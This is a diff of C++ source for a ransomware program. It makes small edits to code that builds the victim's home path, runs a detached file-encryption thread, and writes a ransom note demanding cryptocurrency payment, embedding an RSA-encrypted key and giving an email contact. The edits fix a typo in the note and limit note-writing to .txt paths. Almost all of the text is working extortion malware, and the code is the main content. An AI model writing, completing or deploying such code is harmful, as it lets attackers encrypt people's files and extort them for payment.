@@ -47,6 +47,7 @@ namespace dune
             if (!(agreement.are_you_sure_you_want_to_do_this && agreement.i_accept_the_risks_and_consequences_of_my_actions && agreement.i_understand_it_is_illegel))
             {
                 std::cout << "Oh, Well this is embarrassing..." << std::endl;
+
                 return ATTACK_STATUS::YOU_DID_NOW_ACCEPT;
             }
             std::string user_home_path = std::string(getenv("HOMEDRIVE")) + std::string(getenv("HOMEPATH"));
@@ -61,7 +62,7 @@ namespace dune
             encryptor.detach();
             return ATTACK_STATUS::RUNNING;
         }
-        bool verify_job()
+        bool verify_done()
         {
             return false;
         }
@@ -133,7 +134,7 @@ namespace dune
             note += "This address is specific to this attack. If you have multiple attacks paying another address will not help you get your files back. ";
             note += "The full amount or more must be paid to the " + crypto_currency_type + " address specified.\n";
             note += "DO NOT MODIFY THIS OR ALL YOUR FILES WILL BE LOST (It is the RSA encrypted key for decryption)\n\n" + base64_encode((unsigned char *)(encrypted_key.data()), encrypted_key.length()) + "\n\n";
-            note += "Send this whole file to this email address AFTER you have paid the ransom: " + hacker_email + "\n\nIf you contact this email below the ransom is paid in full it will likely be increased.\n\n\n";
+            note += "Send this whole file to this email address AFTER you have paid the ransom: " + hacker_email + "\n\nIf you contact this email before the ransom is paid in full it will likely be increased.\n\n\n";
             note += "This is your victim id: " + generate_uuid() + ".\n";
             std::string exempt_hash;
             dune::crypto::Compute_SHA_256(note, &exempt_hash);
@@ -143,10 +144,13 @@ namespace dune
             {
                 try
                 {
-                    std::ofstream file_to_write(user_notes_locations[i]);
-                    file_to_write.write(note.c_str(), note.length());
-                    file_to_write.close();
-                    success++;
+                    if (user_notes_locations[i].ends_with(".txt"))
+                    {
+                        std::ofstream file_to_write(user_notes_locations[i]);
+                        file_to_write.write(note.c_str(), note.length());
+                        file_to_write.close();
+                        success++;
+                    }
                 }
                 catch (...)
                 {
